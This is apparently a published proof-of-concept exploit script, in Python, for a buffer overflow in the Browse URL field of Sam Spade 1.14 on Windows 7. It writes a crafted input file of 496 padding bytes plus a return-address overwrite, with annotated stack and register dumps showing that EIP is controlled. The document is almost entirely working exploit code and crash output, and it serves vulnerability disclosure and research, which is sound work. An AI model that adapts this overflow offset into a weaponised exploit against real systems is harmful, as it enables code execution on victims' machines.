﻿#!/usr/bin/env python
# Exploit Title     : Sam Spade 1.14 Browse URL Buffer Overflow PoC
# Discovery by      : Nipun Jaswal
# Email             : mail@nipunjaswal.info
# Discovery Date    : 14/11/2015
# Vendor Homepage   : http://samspade.org
# Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html
# Tested Version    : 1.14
# Vulnerability Type: Denial of Service / Proof Of Concept/ Eip Overwrite
# Tested on OS      : Windows 7 Home Basic
# Crash Point       : Go to Tools > Browse Web> Enter the contents of 'sam_spade_browse_url.txt' > OK , Note: Do #Not Remove the http://
##########################################################################################
#  -----------------------------------NOTES----------------------------------------------#
##########################################################################################
# And the Stack
#0012F73C   41414141  AAAA
#0012F740   41414141  AAAA
#0012F744   DEADBEAF  ¯¾­Þ

# Registers
#EAX 00000001
#ECX 00000001
#EDX 00000030
#EBX 00000000
#ESP 0012F74C
#EBP 41414141
#ESI 008DA260
#EDI 0176F4E0
#EIP DEADBEAF

f = open("sam_spade_browse_url.txt", "w")
Junk = "A"* 496
eip_overwrite = "\xaf\xbe\xad\xde"
f.write(Junk+eip_overwrite)
f.close()
